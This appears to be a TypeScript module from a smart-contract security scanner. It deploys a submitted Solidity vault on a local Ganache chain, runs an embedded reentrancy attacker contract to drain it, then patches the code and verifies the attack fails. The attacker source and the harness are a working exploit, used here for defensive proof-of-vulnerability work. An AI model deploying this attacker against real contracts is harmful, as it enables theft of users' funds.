import crypto from "node:crypto";
import ganache from "ganache";
import solc from "solc";
import { BrowserProvider, ContractFactory, formatEther, keccak256, toUtf8Bytes } from "ethers";
import type { Artifact } from "./compile.js";
import type { AgentResult, ScanReport } from "./types.js";
import { estimateMantleFees } from "./mantleGas.js";

const attackerSource = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IVault { function deposit() external payable; function withdraw() external; }
contract SubmittedSourceAttacker {
    IVault public immutable target;
    uint256 public immutable unit = 1 ether;
    constructor(address targetAddress) { target = IVault(targetAddress); }
    function attack() external payable {
        require(msg.value == unit, "send 1 ether");
        target.deposit{value: unit}();
        target.withdraw();
    }
    receive() external payable {
        if (address(target).balance >= unit) target.withdraw();
    }
}`;

function result(id: string, name: string, role: string, summary: string, evidence: string[], status: AgentResult["status"] = "passed", artifact?: AgentResult["artifact"]): AgentResult {
  return { id, name, role, status, summary, evidence, durationMs: 0, artifact };
}

const hash = (value: string) => keccak256(toUtf8Bytes(value));
const lineOf = (source: string, index: number) => source.slice(0, index).split("\n").length;

function artifact(kind: NonNullable<AgentResult["artifact"]>["kind"], value: unknown): AgentResult["artifact"] {
  const content = typeof value === "string" ? value : JSON.stringify(value, null, 2);
  return { kind, content, hash: hash(content) };
}

function patchDiff(source: string, patchedSource: string) {
  const before = source.split("\n");
  const after = patchedSource.split("\n");
  const changed = before.map((line, index) => line === after[index] ? ` ${line}` : `-${line}\n+${after[index] ?? ""}`);
  if (after.length > before.length) changed.push(...after.slice(before.length).map((line) => `+${line}`));
  return changed.filter((line) => line.startsWith("+") || line.startsWith("-")).join("\n");
}

function applyCeiPatch(source: string) {
  const pattern = /(\(bool\s+[A-Za-z_][A-Za-z0-9_]*\s*,?\s*\)\s*=\s*msg\.sender\.call\s*\{[^}]*value\s*:\s*[^}]+\}\s*\([^;]*\)\s*;)([\s\S]*?)(balances?\s*\[\s*msg\.sender\s*\]\s*=\s*0\s*;)/;
  const match = source.match(pattern);
  if (!match) throw new Error("Source-specific proof requires a supported checks-effects-interactions reentrancy pattern.");
  return source.replace(pattern, `${match[3]}\n        ${match[1]}${match[2]}`);
}

function compileProofArtifacts(name: string, source: string, patchedSource: string) {
  const output = JSON.parse(solc.compile(JSON.stringify({
    language: "Solidity",
    sources: {
      [name]: { content: source },
      [`Patched-${name}`]: { content: patchedSource },
      "SubmittedSourceAttacker.sol": { content: attackerSource }
    },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      evmVersion: "shanghai",
      outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } }
    }
  })));
  const errors = (output.errors ?? []).filter((item: { severity: string }) => item.severity === "error");
  if (errors.length) throw new Error(errors.map((item: { formattedMessage: string }) => item.formattedMessage).join("\n"));

  const originalContracts = output.contracts?.[name] ?? {};
  const eligible = Object.entries(originalContracts).filter(([, contract]: [string, any]) => {
    const functions = contract.abi.filter((item: any) => item.type === "function");
    const constructor = contract.abi.find((item: any) => item.type === "constructor");
    return functions.some((item: any) => item.name === "deposit" && item.stateMutability === "payable" && item.inputs.length === 0)
      && functions.some((item: any) => item.name === "withdraw" && item.inputs.length === 0)
      && (!constructor || constructor.inputs.length === 0)
      && contract.evm.bytecode.object;
  });
  if (eligible.length !== 1) throw new Error("Source-specific proof requires exactly one deployable contract with payable deposit() and withdraw() functions and no constructor arguments.");
  const contractName = eligible[0][0];
  const artifact = (file: string, contract: string): Artifact => {
    const compiled = output.contracts[file][contract];
    return { abi: compiled.abi, bytecode: `0x${compiled.evm.bytecode.object}` };
  };
  return {
    contractName,
    original: artifact(name, contractName),
    patched: artifact(`Patched-${name}`, contractName),
    attacker: artifact("SubmittedSourceAttacker.sol", "SubmittedSourceAttacker")
  };
}

async function deploy(artifact: Artifact, signer: Awaited<ReturnType<BrowserProvider["getSigner"]>>, args: unknown[] = []) {
  const contract = await new ContractFactory(artifact.abi, artifact.bytecode, signer).deploy(...args);
  await contract.waitForDeployment();
  return contract as any;
}

export async function runSourceReentrancyProof(name: string, source: string): Promise<ScanReport> {
  const patchedSource = applyCeiPatch(source);
  const artifacts = compileProofArtifacts(name, source, patchedSource);
  const functions = artifacts.original.abi
    .filter((item: any) => item.type === "function")
    .map((item: any) => ({ name: item.name, mutability: item.stateMutability, inputs: item.inputs.map((input: any) => input.type) }));
  const externalCallIndex = source.search(/msg\.sender\.call\s*\{/);
  const stateUpdateIndex = source.search(/balances?\s*\[\s*msg\.sender\s*\]\s*=\s*0/);
  const architectureManifest = {
    source: name,
    contract: artifacts.contractName,
    sourceHash: hash(source),
    functions,
    assets: ["native MNT held by contract"],
    trustBoundaries: ["withdraw() transfers control to msg.sender"],
    invariants: ["a credited balance must not be withdrawn more than once"]
  };
  const attackPlan = {
    vulnerability: "reentrancy / interaction before effect",
    entrypoint: "withdraw()",
    externalCallLine: lineOf(source, externalCallIndex),
    stateUpdateLine: lineOf(source, stateUpdateIndex),
    preconditions: ["attacker can deposit 1 MNT", "vault has at least 1 MNT beyond attacker deposit"],
    successCondition: "attacker balance increase exceeds attacker deposit",
    attackerHash: hash(attackerSource)
  };
  const generatedPatchDiff = patchDiff(source, patchedSource);
  const patchArtifact = {
    strategy: "checks-effects-interactions reorder",
    originalSourceHash: hash(source),
    patchedSourceHash: hash(patchedSource),
    diff: generatedPatchDiff
  };
  const chain = ganache.provider({ chain: { chainId: 5003 }, wallet: { totalAccounts: 4, defaultBalance: 1000 }, logging: { quiet: true } });
  const provider = new BrowserProvider(chain as never);
  const deployer = await provider.getSigner(0);
  const victim = await provider.getSigner(1);
  const attackerOwner = await provider.getSigner(2);

  const vulnerable = await deploy(artifacts.original, deployer);
  const vulnerableAddress = await vulnerable.getAddress();
  await (await vulnerable.connect(victim).deposit({ value: 10n * 10n ** 18n })).wait();
  const cleanUser = await provider.getSigner(3);
  await (await vulnerable.connect(cleanUser).deposit({ value: 10n ** 18n })).wait();
  const vulnerableWithdrawReceipt = await (await vulnerable.connect(cleanUser).withdraw()).wait();
  const attacker = await deploy(artifacts.attacker, attackerOwner, [vulnerableAddress]);
  const before = await provider.getBalance(await attacker.getAddress());
  const attackReceipt = await (await attacker.connect(attackerOwner).attack({ value: 10n ** 18n })).wait();
  const stolen = await provider.getBalance(await attacker.getAddress()) - before - 10n ** 18n;
  if (stolen <= 0n) throw new Error("The submitted source matched the heuristic pattern, but the executable reentrancy attack did not demonstrate stolen funds.");

  const patched = await deploy(artifacts.patched, deployer);
  const patchedAddress = await patched.getAddress();
  await (await patched.connect(victim).deposit({ value: 10n * 10n ** 18n })).wait();
  await (await patched.connect(cleanUser).deposit({ value: 10n ** 18n })).wait();
  const patchedWithdrawReceipt = await (await patched.connect(cleanUser).withdraw()).wait();
  const patchedAttacker = await deploy(artifacts.attacker, attackerOwner, [patchedAddress]);
  let replayBlocked = false;
  try {
    await (await patchedAttacker.connect(attackerOwner).attack({ value: 10n ** 18n })).wait();
  } catch {
    replayBlocked = true;
  }

  const scanId = `SRC-PROOF-${crypto.randomBytes(4).toString("hex").toUpperCase()}`;
  const gasVulnerable = BigInt(vulnerableWithdrawReceipt?.gasUsed ?? 0);
  const gasSecured = BigInt(patchedWithdrawReceipt?.gasUsed ?? 0);
  const delta = gasVulnerable === 0n ? 0 : Number((gasSecured - gasVulnerable) * 10000n / gasVulnerable) / 100;
  const mantleFeeEstimate = await estimateMantleFees(gasVulnerable, gasSecured);
  const proofManifest = {
    version: "manwall-source-proof-v1",
    scanId,
    chainId: 5003,
    architecture: architectureManifest,
    attackPlan,
    patch: patchArtifact,
    execution: {
      target: vulnerableAddress,
      patchedTarget: patchedAddress,
      attacker: await attacker.getAddress(),
      attackTransaction: attackReceipt?.hash,
      stolenWei: stolen.toString(),
      replayBlocked
    },
    gas: {
      originalWithdrawal: gasVulnerable.toString(),
      patchedWithdrawal: gasSecured.toString(),
      deltaPercent: `${delta.toFixed(2)}%`,
      mantleFeeEstimate
    }
  };
  const evidenceHash = hash(JSON.stringify(proofManifest));
  const agents = [
    result("architecture", "Architecture Agent", "Builds a source and ABI-derived architecture manifest.", `Mapped ${artifacts.contractName}'s callable interface, asset boundary, trust boundary, and withdrawal invariant.`, [`Manifest hash: ${artifact("architecture-manifest", architectureManifest)?.hash}`, `${functions.length} callable functions mapped`], "passed", artifact("architecture-manifest", architectureManifest)),
    result("attack", "Attack Agent", "Builds an executable attack plan from source evidence.", `Selected reentrancy because the external call at line ${attackPlan.externalCallLine} precedes the state update at line ${attackPlan.stateUpdateLine}.`, [`Attacker source hash: ${attackPlan.attackerHash}`, `Success condition: ${attackPlan.successCondition}`], "passed", artifact("attack-plan", attackPlan)),
    result("exploit", "Exploit Agent", "Executes the attacker against submitted source.", `Exploit confirmed against the exact submitted source; ${formatEther(stolen)} native tokens drained beyond attacker deposit.`, [`Attack transaction: ${attackReceipt?.hash}`]),
    result("patch", "Patch Agent", "Produces a reviewable bounded remediation artifact.", "Generated and compiled a checks-effects-interactions patch for the submitted source.", [`Original hash: ${patchArtifact.originalSourceHash}`, `Patched hash: ${patchArtifact.patchedSourceHash}`], "passed", artifact("patch-diff", generatedPatchDiff)),
    result("verification", "Verification Agent", "Replays the original attacker against patched source.", replayBlocked ? "Patch verified: the same attack now reverts." : "Patch failed verification.", [`Original exploit replay blocked: ${replayBlocked}`], replayBlocked ? "passed" : "failed"),
    result("gas", "Gas Agent", "Measures the submitted source and applies live Mantle fee data.", `Patched normal withdrawal measured ${gasSecured.toString()} gas versus ${gasVulnerable.toString()} gas before patch.`, [
      `Measured gas delta: ${delta.toFixed(2)}%`,
      mantleFeeEstimate.status === "live" ? `Live Mantle Sepolia secured withdrawal estimate: ${mantleFeeEstimate.securedCostMnt} MNT` : `Live Mantle fee estimate unavailable: ${mantleFeeEstimate.detail}`
    ]),
    result("attestation", "Attestation Agent", "Canonicalizes the complete proof manifest for wallet publication.", "Bound architecture, attack, exploit, patch, replay, and Mantle gas evidence into one proof manifest.", [`Evidence hash: ${evidenceHash}`, `Manifest version: ${proofManifest.version}`], "passed", artifact("proof-manifest", proofManifest))
  ];
  return {
    scanId,
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    target: { name: artifacts.contractName, network: "Mantle Sepolia simulation", chainId: 5003, address: vulnerableAddress },
    verdict: {
      severity: "critical",
      vulnerability: "Source-specific reentrancy / interaction before effect",
      exploitConfirmed: true,
      patchVerified: replayBlocked,
      fundsAtRisk: `${formatEther(stolen)} MNT demonstrated`
    },
    agents,
    gas: {
      vulnerableWithdraw: gasVulnerable.toString(),
      securedWithdraw: gasSecured.toString(),
      deltaPercent: `${delta.toFixed(2)}%`,
      mantleFeeEstimate,
      mantleAdvice: ["Measure the submitted patch with Foundry gas snapshots before production use."]
    },
    attestation: { evidenceHash, identityURI: "manwall://mantle/source-specific-proof/v1", registryMode: "local-proof", manifest: proofManifest }
  };
}
